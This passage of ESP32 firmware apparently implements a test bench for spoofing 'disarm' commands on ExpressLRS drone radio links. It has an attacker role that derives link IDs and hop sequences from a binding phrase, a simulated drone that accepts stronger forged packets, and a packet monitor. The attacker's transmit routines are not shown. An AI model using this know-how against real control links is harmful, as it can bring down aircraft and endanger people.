    if (!wasEnabled) {
      soloNextTxUs = esp_timer_get_time();
      wasEnabled = true;
      Serial.println("[radioTask] Attack ENABLED — soloNextTxUs reset.");
    }

    if (aggrMode == AGG_SYNC) {
      runSync();
    } else {
      runSolo();
    }
    // runSync/runSolo сами вызывают pushDisplay()
  }
}

// ─────────────────────────────────────────────────────────────────────
// Кнопка BOOT — только Core 0 (loop)
// ─────────────────────────────────────────────────────────────────────
static void handleButton() {
  bool btnNow = digitalRead(BUTTON_PIN);
  if (btnNow == LOW && lastBtnState == HIGH &&
      (millis() - btnDebounceMs > 250)) {
    attackEnabled = !attackEnabled;
    btnDebounceMs = millis();
    digitalWrite(BOARD_LED, attackEnabled ? HIGH : LOW);
    Serial.printf("[BTN] Attack %s\n", attackEnabled ? "ON" : "OFF");
  }
  lastBtnState = btnNow;
}

// ─────────────────────────────────────────────────────────────────────
// OLED — Core 0, читает из очереди
// ─────────────────────────────────────────────────────────────────────
static uint32_t lastOledUpdateMs = 0;

static void updateOLED() {
  if (millis() - lastOledUpdateMs < 200)
    return;
  lastOledUpdateMs = millis();

  DisplayState_t ds = {};
  xQueuePeek(displayQueue, &ds, 0);

  char line[32];
  oled.clearBuffer();
  oled.setFont(u8g2_font_6x13_tf);
  oled.drawStr(0, 13, ds.attackEnabled ? "AGGRESSOR [ON]" : "AGGRESSOR [OFF]");
  snprintf(line, sizeof(line), "Mode: %s", ds.aggrMode ? "SYNC" : "SOLO");
  oled.drawStr(0, 28, line);
  snprintf(line, sizeof(line), "F: %.1f [%d]",
           FHSSgetFreq(fhssSequence, ds.fhssIndex), ds.fhssIndex);
  oled.drawStr(0, 43, line);
  if (ds.rxPilotCount > 0) {
    snprintf(line, sizeof(line), "PLT RSSI: %.0f dBm", ds.lastPilotRSSI);
  } else {
    snprintf(line, sizeof(line), "PLT: ---");
  }
  oled.drawStr(0, 58, line);
  oled.sendBuffer();
}

// ─────────────────────────────────────────────────────────────────────
// SETUP — ROLE_AGGRESSOR
// ─────────────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  delay(3000);
  Serial.println("\n========================================");
  Serial.println("  ELRS DISARM System v3.0");
  Serial.println("  Role: " DEVICE_ROLE);
  Serial.println("========================================");

  pinMode(ANT_SW_VDD, OUTPUT);
  pinMode(ANT_SW_TX, OUTPUT);
  pinMode(ANT_SW_RX, OUTPUT);
  pinMode(BOARD_LED, OUTPUT);
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  digitalWrite(ANT_SW_VDD, HIGH);
  digitalWrite(BOARD_LED, LOW);
  antSwitchRX();

  Serial.printf("\n[BIND] Phrase: \"%s\"\n", BINDING_PHRASE);
  generateUID(BINDING_PHRASE, uid);
  Serial.printf("[BIND] UID: %02X:%02X:%02X:%02X:%02X:%02X\n", uid[0], uid[1],
                uid[2], uid[3], uid[4], uid[5]);
  crcSeed = ((uint16_t)uid[4] << 8) | uid[5];
  crcCalc.init(14, ELRS_CRC14_POLY);
  generateFHSSsequence(uid, fhssSequence);
  printFHSSTable();

  radioSPI.begin(RADIO_SCLK_PIN, RADIO_MISO_PIN, RADIO_MOSI_PIN, RADIO_CS_PIN);
  int16_t state = radio.begin();
  if (state != RADIOLIB_ERR_NONE) {
    Serial.printf("[RADIO] FAIL begin()=%d\n", state);
    while (true)
      delay(1000);
  }
  radio.setFrequency(FHSSgetFreq(fhssSequence, 0));
  radio.setBandwidth(CONFIG_RADIO_BW);
  radio.setSpreadingFactor(CONFIG_RADIO_SF);
  radio.setCodingRate(CONFIG_RADIO_CR);
  radio.setSyncWord(CONFIG_RADIO_SYNC_WORD);
  radio.setPreambleLength(CONFIG_RADIO_PREAMBLE);
  radio.setOutputPower(CONFIG_RADIO_OUTPUT_POWER);
  Serial.println("[RADIO] LR1121 OK");

  Wire.begin(I2C_SDA, I2C_SCL);
  delay(100);
  if (!oled.begin()) {
    Serial.println("[OLED] FAIL");
  } else {
    oled.clearBuffer();
    oled.setFont(u8g2_font_6x13_tf);
    oled.drawStr(0, 30, "AGGRESSOR");
    oled.drawStr(0, 50, "READY");
    oled.sendBuffer();
    Serial.println("[OLED] OK");
  }

  displayQueue = xQueueCreate(1, sizeof(DisplayState_t));
  configASSERT(displayQueue != nullptr);

  // Привязываем ISR к DIO9. RadioLib вызовет setRxFlagISR() при
  // каждом принятом пакете. Должен быть вызван ДО startReceive().
  radio.setPacketReceivedAction(setRxFlagISR);

  // Сохраняем хендл задачи — ISR будет использовать его для notify.
  xTaskCreatePinnedToCore(radioTask, "radioTask", 4096, nullptr, 5,
                          &radioTaskHandle, 1);
  configASSERT(radioTaskHandle != nullptr);

  Serial.println("  AGGRESSOR ready. Press BOOT to attack.");
  Serial.println("========================================\n");
}

// ─────────────────────────────────────────────────────────────────────
// LOOP — ROLE_AGGRESSOR (Core 0)
// Только: кнопка BOOT + обновление OLED
// ─────────────────────────────────────────────────────────────────────
void loop() {
  handleButton();
  updateOLED();
}

#endif // ROLE_AGGRESSOR

// ====================================================================
// =========================  ROLE_DRONE  =============================
// ====================================================================
#ifdef ROLE_DRONE

#include <RadioLib.h>
#include <U8g2lib.h>
#include <Wire.h>

// ─────────────────────────────────────────────────────────────────────
// Аппаратура
// ─────────────────────────────────────────────────────────────────────
SPIClass radioSPI(HSPI);
LR1121 radio = new Module(RADIO_CS_PIN, RADIO_DIO9_PIN, RADIO_RST_PIN,
                          RADIO_BUSY_PIN, radioSPI);
U8G2_SSD1306_128X64_NONAME_F_HW_I2C oled(U8G2_R0, U8X8_PIN_NONE);

// ─────────────────────────────────────────────────────────────────────
// Структура для передачи данных на OLED/LED через очередь
// ─────────────────────────────────────────────────────────────────────
struct DisplayState_t {
  uint8_t droneState; // 0=DS_SEARCH, 1=DS_TRACK, 2=DS_DISARMED
  uint8_t fhssIndex;
  float trustedRSSI;
  float lastRSSI;
  uint8_t consecutiveDisarm;
  uint32_t rxTotalCount;
};
static QueueHandle_t displayQueue = nullptr;

// ─────────────────────────────────────────────────────────────────────
// Константы дрона
// LED-тайминги в мс — используем millis(), не критично
// Потеря сигнала — в мкс через esp_timer_get_time()
// ─────────────────────────────────────────────────────────────────────
#define LED_BLINK_SLOW_MS 500
#define LED_BLINK_FAST_MS 50
#define DISARMED_BLINK_CNT 100
#ifndef RSSI_MARGIN_DB
#define RSSI_MARGIN_DB 2.0f
#endif

enum DroneState { DS_SEARCH, DS_TRACK, DS_DISARMED };

// Переменные состояния — доступ ТОЛЬКО из radioTask (Core 1)
static DroneState droneState = DS_SEARCH;
static uint8_t fhssIndex = 0;
static uint8_t localNonce = 0;
static float trustedRSSI = -999.0f;
static float lastRSSI = -999.0f;
static uint8_t consecutiveDisarm = 0;
static int64_t lastPacketUs = 0; // время последнего пакета (мкс)
static uint32_t rxTotalCount = 0;

// LED — доступ из loop() (Core 0), читает droneState из очереди
static uint32_t lastLedToggleMs = 0;
static bool ledOn = false;
static uint16_t disarmedBlinkCount = 0;

// ─────────────────────────────────────────────────────────────────────
// Антенный переключатель — дрон всегда в RX
// ─────────────────────────────────────────────────────────────────────
static void antSwitchRX() {
  digitalWrite(ANT_SW_TX, LOW);
  digitalWrite(ANT_SW_RX, HIGH);
}

static int16_t radioSetFreqByIndex(uint8_t idx) {
  return radio.setFrequency(FHSSgetFreq(fhssSequence, idx));
}

static bool validateReceivedPacket(const OTA_Packet4_s *pkt) {
  uint8_t buf[OTA4_CRC_CALC_LEN];
  memcpy(buf, pkt, OTA4_CRC_CALC_LEN);
  uint16_t pktCRC = ((uint16_t)(pkt->crcHigh) << 8) | pkt->crcLow;
  for (uint8_t n = 0; n < ELRS_FHSS_HOP_INTERVAL; n++) {
    buf[0] = (pkt->type & 0x03) | (((n % ELRS_FHSS_HOP_INTERVAL) + 1) << 2);
    if (crcCalc.calc(buf, OTA4_CRC_CALC_LEN, crcSeed) == pktCRC)
      return true;
  }
  return false;
}

// ─────────────────────────────────────────────────────────────────────
// ISR + хендл задачи — аналогично AGGRESSOR
// ─────────────────────────────────────────────────────────────────────
static TaskHandle_t radioTaskHandle = nullptr;

void IRAM_ATTR setRxFlagISR() {
  BaseType_t xHigherPriorityTaskWoken = pdFALSE;
  vTaskNotifyGiveFromISR(radioTaskHandle, &xHigherPriorityTaskWoken);
  portYIELD_FROM_ISR(xHigherPriorityTaskWoken);
}

// ─────────────────────────────────────────────────────────────────────
// Вспомогательная: снимок состояния в очередь без блокировки
// ─────────────────────────────────────────────────────────────────────
static inline void pushDisplay() {
  DisplayState_t ds;
  ds.droneState = (uint8_t)droneState;
  ds.fhssIndex = fhssIndex;
  ds.trustedRSSI = trustedRSSI;
  ds.lastRSSI = lastRSSI;
  ds.consecutiveDisarm = consecutiveDisarm;
  ds.rxTotalCount = rxTotalCount;
  xQueueOverwrite(displayQueue, &ds);
}

// ─────────────────────────────────────────────────────────────────────
// radioTask — Core 1, приоритет 5
//
// БЫЛО: radio.receive(buf, sz, RX_TIMEOUT_MS=13мс) блокирует поток.
//       При пропуске 1 пакета задача «залипает» на 13 мс → следующий слот
//       начинается с опозданием → накопительная рассинхронизация FHSS.
//
// СТАЛО: radio.startReceive() + ulTaskNotifyTake(15 мс).
//       ISR будит задачу через ~1.7 мс (ToA пакета SF6/BW500).
//       Таймаут 15 мс = ровно 1 пропущенный слот.
//       Компенсация упрощена: всегда 1×HOP+nonce++ на таймаут.
// ─────────────────────────────────────────────────────────────────────
static void radioTask(void *pvParameters) {
  lastPacketUs = esp_timer_get_time();
  Serial.println("[radioTask] DRONE started on Core 1");

  while (true) {
    // ── 1. Частота для текущего состояния ─────────────────────────
    if (droneState == DS_SEARCH) {
      fhssIndex = FHSS_RENDEZVOUS_IDX; // rendezvous-канал, не двигаться
    }
    radioSetFreqByIndex(fhssIndex);

    // ── 2. Неблокирующий запуск приёма ────────────────────────────
    {
      int16_t st = radio.startReceive();
      if (st != RADIOLIB_ERR_NONE) {
        Serial.printf("[DRONE] startReceive err=%d\n", st);
      }
    }

    // ── 3. Ждём пакет или таймаут 15 мс ──────────────────────────
    uint32_t res = ulTaskNotifyTake(pdTRUE, pdMS_TO_TICKS(15));

    if (res > 0) {
      // ── 4а. ISR: пакет принят ─────────────────────────────────
      uint8_t rxBuf[OTA4_PACKET_SIZE];
      radio.readData(rxBuf, OTA4_PACKET_SIZE);
      OTA_Packet4_s *pkt = (OTA_Packet4_s *)rxBuf;

      switch (droneState) {
      // ── DS_SEARCH ───────────────────────────────────────────
      case DS_SEARCH: {
        if (!validateReceivedPacket(pkt))
          break; // чужой эфир, молча пропускаем
        float rssi = radio.getRSSI();
        if (pkt->type == PACKET_TYPE_SYNC && pkt->sync.UID4 == uid[4] &&
            pkt->sync.UID5 == uid[5]) {
          fhssIndex = pkt->sync.fhssIndex;
          localNonce = pkt->sync.nonce;
          trustedRSSI = rssi;
          lastRSSI = rssi;
          lastPacketUs = esp_timer_get_time();
          consecutiveDisarm = 0;
          droneState = DS_TRACK;
          Serial.printf("[SEARCH→TRACK] SYNC idx=%d nonce=%d RSSI=%.0f\n",
                        fhssIndex, localNonce, rssi);
        } else if (pkt->type == PACKET_TYPE_RCDATA) {
          trustedRSSI = rssi;
          lastRSSI = rssi;
          lastPacketUs = esp_timer_get_time();
          localNonce = 0;
          fhssIndex = FHSS_RENDEZVOUS_IDX;
          consecutiveDisarm = 0;
          droneState = DS_TRACK;
          Serial.printf("[SEARCH→TRACK] RC armed=%d RSSI=%.0f\n",
                        pkt->rc.isArmed, rssi);
        }
        break;
      }

      // ── DS_TRACK ────────────────────────────────────────────
      case DS_TRACK: {
        if (!validateReceivedPacket(pkt)) {
          Serial.printf("[TRACK] CRC FAIL idx=%d\n", fhssIndex);
          // Пакет пришёл но CRC плохой — всё равно продвигаем nonce (слот был)
          if (ELRS_SHOULD_HOP(localNonce))
            fhssIndex = FHSSnextIndex(fhssIndex);
          localNonce++;
          break;
        }
        float rssi = radio.getRSSI();
        uint8_t pktType = pkt->type;
        lastPacketUs = esp_timer_get_time();
        lastRSSI = rssi;
        rxTotalCount++;

        if (pktType == PACKET_TYPE_SYNC && pkt->sync.UID4 == uid[4] &&
            pkt->sync.UID5 == uid[5]) {
          fhssIndex = pkt->sync.fhssIndex;
          localNonce = pkt->sync.nonce;
          // Serial.printf("[TRACK] SYNC idx=%d nonce=%d RSSI=%.0f\n",
          // fhssIndex,
          //               localNonce, rssi); // подавлен: спам 100 раз/сек
        }

        if (pktType == PACKET_TYPE_RCDATA && pkt->rc.isArmed == 0 &&
            rssi > trustedRSSI + RSSI_MARGIN_DB) {
          consecutiveDisarm++;
          Serial.printf("[TRACK] ATTACK! %d/%d rssi=%.0f trusted=%.0f\n",
                        consecutiveDisarm, DISARM_THRESHOLD, rssi, trustedRSSI);
          if (consecutiveDisarm >= DISARM_THRESHOLD) {
            droneState = DS_DISARMED;
            disarmedBlinkCount = 0;
            Serial.println("!!! DRONE DISARMED !!!");
            pushDisplay();
            continue; // перейти к следующей итерации while, не делать HOP
          }
        } else {
          consecutiveDisarm = 0;
        }

        // HOP + nonce в DS_TRACK
        if (ELRS_SHOULD_HOP(localNonce))
          fhssIndex = FHSSnextIndex(fhssIndex);
        localNonce++;
        break;
      }

      // ── DS_DISARMED ─────────────────────────────────────────
      case DS_DISARMED: {
        if (validateReceivedPacket(pkt)) {
          // Следим за каналом для отладки — логировать при необходимости
        }
        if (ELRS_SHOULD_HOP(localNonce))
          fhssIndex = FHSSnextIndex(fhssIndex);
        localNonce++;
        break;
      }
      }

    } else {
      // ── 4б. Таймаут: пропущен ровно 1 слот ───────────────────
      switch (droneState) {
      case DS_SEARCH:
        // В SEARCH не двигаем nonce — просто повторяем прослушку rendezvous
        break;
      case DS_TRACK:
        // Serial.printf("[TRACK] MISS idx=%d nonce=%d\n", fhssIndex,
        // localNonce); // подавлен: спам при потере
        if (ELRS_SHOULD_HOP(localNonce))
          fhssIndex = FHSSnextIndex(fhssIndex);
        localNonce++;
        if (esp_timer_get_time() - lastPacketUs > TRACK_TIMEOUT_US) {
          Serial.println("[TRACK→SEARCH] Signal lost");
          droneState = DS_SEARCH;
          trustedRSSI = -999.0f;
          lastRSSI = -999.0f;
          consecutiveDisarm = 0;
        }
        break;
      case DS_DISARMED:
        if (ELRS_SHOULD_HOP(localNonce))
          fhssIndex = FHSSnextIndex(fhssIndex);
        localNonce++;
        break;
      }
    }

    pushDisplay();
  }
}

// ─────────────────────────────────────────────────────────────────────
// updateLED — Core 0, читает состояние из очереди.
// Использует millis() — некритично для точности.
// ─────────────────────────────────────────────────────────────────────
static void updateLED() {
  uint32_t now = millis();
  // Читаем состояние без блокировки
  DisplayState_t ds = {};
  xQueuePeek(displayQueue, &ds, 0);
  DroneState st = (DroneState)ds.droneState;

  switch (st) {
  case DS_SEARCH:
    if (now - lastLedToggleMs >= LED_BLINK_SLOW_MS) {
      ledOn = !ledOn;
      digitalWrite(BOARD_LED, ledOn ? HIGH : LOW);
      lastLedToggleMs = now;
    }
    break;
  case DS_TRACK:
    if (!ledOn) {
      digitalWrite(BOARD_LED, HIGH);
      ledOn = true;
    }
    break;
  case DS_DISARMED:
    if (disarmedBlinkCount < DISARMED_BLINK_CNT) {
      if (now - lastLedToggleMs >= LED_BLINK_FAST_MS) {
        ledOn = !ledOn;
        digitalWrite(BOARD_LED, ledOn ? HIGH : LOW);
        lastLedToggleMs = now;
        disarmedBlinkCount++;
      }
    } else {
      if (ledOn) {
        digitalWrite(BOARD_LED, LOW);
        ledOn = false;
      }
    }
    break;
  }
}

// ─────────────────────────────────────────────────────────────────────
// OLED — Core 0, читает из очереди
// ─────────────────────────────────────────────────────────────────────
static uint32_t lastOledUpdateMs = 0;

static void updateOLED() {
  if (millis() - lastOledUpdateMs < 200)
    return;
  lastOledUpdateMs = millis();

  DisplayState_t ds = {};
  xQueuePeek(displayQueue, &ds, 0);

  char line[32];
  oled.clearBuffer();
  oled.setFont(u8g2_font_6x13_tf);

  switch ((DroneState)ds.droneState) {
  case DS_SEARCH:
    oled.drawStr(0, 13, "DRONE [SEARCH]");
    break;
  case DS_TRACK:
    oled.drawStr(0, 13, "DRONE [ARMED]");
    break;
  case DS_DISARMED:
    oled.drawStr(0, 13, "DRONE [DISARMED]");
    break;
  }

  if (ds.trustedRSSI > -900.0f) {
    snprintf(line, sizeof(line), "TRU:%ddBm CUR:%ddBm", (int)ds.trustedRSSI,
             (int)ds.lastRSSI);
  } else {
    snprintf(line, sizeof(line), "TRU:--- CUR:---");
  }
  oled.drawStr(0, 28, line);

  snprintf(line, sizeof(line), "F: %.1f [%d]",
           FHSSgetFreq(fhssSequence, ds.fhssIndex), ds.fhssIndex);
  oled.drawStr(0, 43, line);

  switch ((DroneState)ds.droneState) {
  case DS_SEARCH:
    snprintf(line, sizeof(line), "LISTENING...");
    break;
  case DS_TRACK:
    snprintf(line, sizeof(line), "ATTACK: %d/%d", ds.consecutiveDisarm,
             DISARM_THRESHOLD);
    break;
  case DS_DISARMED:
    snprintf(line, sizeof(line), "REBOOT TO RECOVER");
    break;
  }
  oled.drawStr(0, 58, line);
  oled.sendBuffer();
}

// ─────────────────────────────────────────────────────────────────────
// SETUP — ROLE_DRONE
// ─────────────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  delay(3000);
  Serial.println("\n========================================");
  Serial.println("  ELRS DISARM System v3.0");
  Serial.println("  Role: " DEVICE_ROLE);
  Serial.println("========================================");

  pinMode(ANT_SW_VDD, OUTPUT);
  pinMode(ANT_SW_TX, OUTPUT);
  pinMode(ANT_SW_RX, OUTPUT);
  pinMode(BOARD_LED, OUTPUT);
  digitalWrite(ANT_SW_VDD, HIGH);
  digitalWrite(BOARD_LED, LOW);
  antSwitchRX();

  Serial.printf("\n[BIND] Phrase: \"%s\"\n", BINDING_PHRASE);
  generateUID(BINDING_PHRASE, uid);
  Serial.printf("[BIND] UID: %02X:%02X:%02X:%02X:%02X:%02X\n", uid[0], uid[1],
                uid[2], uid[3], uid[4], uid[5]);
  crcSeed = ((uint16_t)uid[4] << 8) | uid[5];
  crcCalc.init(14, ELRS_CRC14_POLY);
  generateFHSSsequence(uid, fhssSequence);
  printFHSSTable();
  Serial.printf("[DRONE] DISARM_THRESHOLD=%d  RSSI_MARGIN=%.0fdB\n",
                DISARM_THRESHOLD, RSSI_MARGIN_DB);
  Serial.printf("[DRONE] RX_TIMEOUT=%dms  TRACK_TIMEOUT_US=%lld\n",
                RX_TIMEOUT_MS, TRACK_TIMEOUT_US);

  radioSPI.begin(RADIO_SCLK_PIN, RADIO_MISO_PIN, RADIO_MOSI_PIN, RADIO_CS_PIN);
  int16_t state = radio.begin();
  if (state != RADIOLIB_ERR_NONE) {
    Serial.printf("[RADIO] FAIL begin()=%d\n", state);
    while (true)
      delay(1000);
  }
  radio.setFrequency(FHSSgetFreq(fhssSequence, FHSS_RENDEZVOUS_IDX));
  radio.setBandwidth(CONFIG_RADIO_BW);
  radio.setSpreadingFactor(CONFIG_RADIO_SF);
  radio.setCodingRate(CONFIG_RADIO_CR);
  radio.setSyncWord(CONFIG_RADIO_SYNC_WORD);
  radio.setPreambleLength(CONFIG_RADIO_PREAMBLE);
  radio.setOutputPower(CONFIG_RADIO_OUTPUT_POWER);
  Serial.println("[RADIO] LR1121 OK");

  Wire.begin(I2C_SDA, I2C_SCL);
  delay(100);
  if (!oled.begin()) {
    Serial.println("[OLED] FAIL");
  } else {
    oled.clearBuffer();
    oled.setFont(u8g2_font_6x13_tf);
    oled.drawStr(0, 30, "DRONE READY");
    oled.sendBuffer();
    Serial.println("[OLED] OK");
  }

  displayQueue = xQueueCreate(1, sizeof(DisplayState_t));
  configASSERT(displayQueue != nullptr);

  // Привязываем ISR к DIO9. Должен быть вызван ДО xTaskCreatePinnedToCore,
  // чтобы radioTaskHandle уже был валиден к первому startReceive().
  radio.setPacketReceivedAction(setRxFlagISR);

  // Сохраняем хендл задачи — ISR будет использовать его для notify.
  xTaskCreatePinnedToCore(radioTask, "radioTask", 4096, nullptr, 5,
                          &radioTaskHandle, 1);
  configASSERT(radioTaskHandle != nullptr);

  Serial.println("  DRONE ready. Searching for pilot...");
  Serial.println("========================================\n");
}

// ─────────────────────────────────────────────────────────────────────
// LOOP — ROLE_DRONE (Core 0)
// Только: LED мигание + обновление OLED 5 раз/сек
// Вся радио-логика вынесена в radioTask (Core 1)
// ─────────────────────────────────────────────────────────────────────
void loop() {
  updateLED();
  updateOLED();
}

#endif // ROLE_DRONE

// ====================================================================
// =====================  ROLE_MONITOR  ===============================
// ====================================================================
#ifdef ROLE_MONITOR

#include <RadioLib.h>

// MONITOR: нет OLED, нет отдельной FreeRTOS задачи.
// Приём пакетов — через ISR на DIO9 (volatile rxReady флаг).
// Смена канала — по esp_timer_get_time() (мкс).
SPIClass radioSPI(HSPI);
LR1121 radio = new Module(RADIO_CS_PIN, RADIO_DIO9_PIN, RADIO_RST_PIN,
                          RADIO_BUSY_PIN, radioSPI);

// rxReady: устанавливается ISR при получении пакета, сбрасывается в loop()
// volatile + IRAM_ATTR ISR защищают от race condition
static volatile bool rxReady = false;

void IRAM_ATTR setRxFlagISR() { rxReady = true; }

static uint8_t currentChannelIdx = 0;
static int64_t channelScanStartUs = 0; // мкс, esp_timer_get_time()

static uint32_t statPkts = 0;
static uint32_t statRc = 0;
static uint32_t statSync = 0;
static uint32_t statCrcFail = 0;
static uint32_t statCollisions = 0;
static uint32_t lastStatMs = 0; // для редкого Serial-лога достаточно millis()

static uint8_t pktsInWindow = 0;
static float lastValidRssi = -999.0f;

static void antSwitchRX() {
  digitalWrite(ANT_SW_TX, LOW);
  digitalWrite(ANT_SW_RX, HIGH);
}

static int16_t radioSetFreqByIndex(uint8_t idx) {
  return radio.setFrequency(FHSSgetFreq(fhssSequence, idx));
}

static bool validateReceivedPacket(const OTA_Packet4_s *pkt) {
  uint8_t buf[OTA4_CRC_CALC_LEN];
  memcpy(buf, pkt, OTA4_CRC_CALC_LEN);
  uint16_t pktCRC = ((uint16_t)(pkt->crcHigh) << 8) | pkt->crcLow;
  for (uint8_t n = 0; n < 4; n++) {
    buf[0] = (pkt->type & 0x03) | (((n % 4) + 1) << 2);
    if (crcCalc.calc(buf, OTA4_CRC_CALC_LEN, crcSeed) == pktCRC)
      return true;
  }
  return false;
}

void setup() {
  Serial.begin(115200);
  delay(3000);
  Serial.println("\n========================================");
  Serial.println("  ELRS DISARM System v3.0");
  Serial.println("  Role: " DEVICE_ROLE);
  Serial.println("========================================");

  pinMode(ANT_SW_VDD, OUTPUT);
  pinMode(ANT_SW_TX, OUTPUT);
  pinMode(ANT_SW_RX, OUTPUT);
  pinMode(BOARD_LED, OUTPUT);
  digitalWrite(ANT_SW_VDD, HIGH);
  digitalWrite(BOARD_LED, LOW);
  antSwitchRX();

  generateUID(BINDING_PHRASE, uid);
  crcSeed = ((uint16_t)uid[4] << 8) | uid[5];
  crcCalc.init(14, ELRS_CRC14_POLY);
  generateFHSSsequence(uid, fhssSequence);

  radioSPI.begin(RADIO_SCLK_PIN, RADIO_MISO_PIN, RADIO_MOSI_PIN, RADIO_CS_PIN);
  int16_t state = radio.begin();
  if (state != RADIOLIB_ERR_NONE) {
    Serial.printf("[RADIO] FAIL begin()=%d\n", state);
    while (true)
      delay(1000);
  }
  radioSetFreqByIndex(currentChannelIdx);
  radio.setBandwidth(CONFIG_RADIO_BW);
  radio.setSpreadingFactor(CONFIG_RADIO_SF);
  radio.setCodingRate(CONFIG_RADIO_CR);
  radio.setSyncWord(CONFIG_RADIO_SYNC_WORD);
  radio.setPreambleLength(CONFIG_RADIO_PREAMBLE);
  radio.setOutputPower(CONFIG_RADIO_OUTPUT_POWER);

  Serial.println("  MONITOR ready. Scanning...");
  Serial.println("========================================\n");

  channelScanStartUs = esp_timer_get_time();
  lastStatMs = millis();

  // Привязываем ISR к DIO9 и запускаем первый приём
  radio.setPacketReceivedAction(setRxFlagISR);
  int16_t rxSt = radio.startReceive();
  if (rxSt != RADIOLIB_ERR_NONE) {
    Serial.printf("[MON] startReceive err=%d\n", rxSt);
  }
}

void loop() {
  uint32_t now = millis();
  if (now - lastStatMs >= 5000) {
    Serial.printf("[MON STAT] pkts=%u rc=%u sync=%u crcfail=%u collisions=%u\n",
                  statPkts, statRc, statSync, statCrcFail, statCollisions);
    lastStatMs = now;
  }

  // Смена канала по таймеру (esp_timer_get_time() в мкс)
  if (esp_timer_get_time() - channelScanStartUs >= RX_WINDOW_EXTRA_US) {
    currentChannelIdx = (currentChannelIdx + 1) % FHSS_CHANNELS;
    radioSetFreqByIndex(currentChannelIdx);
    channelScanStartUs = esp_timer_get_time();
    pktsInWindow = 0;
    lastValidRssi = -999.0f;
    // Перезапуск приёма на новом канале
    radio.startReceive();
  }

  // Проверяем флаг ISR (не блокируемся!)
  if (!rxReady)
    return;
  rxReady = false;

  uint8_t rxBuf[OTA4_PACKET_SIZE];
  radio.readData(rxBuf, OTA4_PACKET_SIZE);

  // Сразу перезапускаем приём на следующий пакет
  radio.startReceive();

  // Обрабатываем принятый пакет
  digitalWrite(BOARD_LED, HIGH);
  statPkts++;
  float rssi = radio.getRSSI();
  float freq = FHSSgetFreq(fhssSequence, currentChannelIdx);
  OTA_Packet4_s *pkt = (OTA_Packet4_s *)rxBuf;

  if (validateReceivedPacket(pkt)) {
    if (pktsInWindow > 0 && fabsf(rssi - lastValidRssi) > 3.0f) {
      statCollisions++;
      Serial.printf("[MON] COLLISION idx=%d freq=%.1f RSSI1=%.0f RSSI2=%.0f\n",
                    currentChannelIdx, freq, lastValidRssi, rssi);
    } else {
      lastValidRssi = rssi;
      pktsInWindow++;
      if (pkt->type == PACKET_TYPE_RCDATA) {
        statRc++;
        Serial.printf("[MON] RC   idx=%d freq=%.1f RSSI=%.0f armed=%d\n",
                      currentChannelIdx, freq, rssi, pkt->rc.isArmed);
      } else if (pkt->type == PACKET_TYPE_SYNC) {
        statSync++;
        Serial.printf(
            "[MON] SYNC idx=%d freq=%.1f RSSI=%.0f fhssIdx=%d nonce=%d\n",
            currentChannelIdx, freq, rssi, pkt->sync.fhssIndex,
            pkt->sync.nonce);
      }
    }
  } else {
    statCrcFail++;
    Serial.printf("[MON] ??? CRC FAIL idx=%d freq=%.1f RSSI=%.0f\n",
                  currentChannelIdx, freq, rssi);
  }
  digitalWrite(BOARD_LED, LOW);
}

#endif // ROLE_MONITOR

// ====================================================================
// =====================  SKELETON (нет роли)  ========================
// ====================================================================
#if !defined(ROLE_AGGRESSOR) && !defined(ROLE_DRONE) &&                        \
    !defined(ROLE_PILOT) && !defined(ROLE_MONITOR)

void setup() {
  Serial.begin(115200);
  delay(3000);
  Serial.println("\n  ELRS DISARM System v3.0 — Role: " DEVICE_ROLE "\n");
  generateUID(BINDING_PHRASE, uid);
  crcSeed = ((uint16_t)uid[4] << 8) | uid[5];
  crcCalc.init(14, ELRS_CRC14_POLY);
  generateFHSSsequence(uid, fhssSequence);
  printFHSSTable();
  Serial.println("  Skeleton active — role not set in platformio.ini");
}

void loop() {
  delay(10000);
  Serial.println("[LOOP] Alive — role not implemented");
}

#endif // skeleton
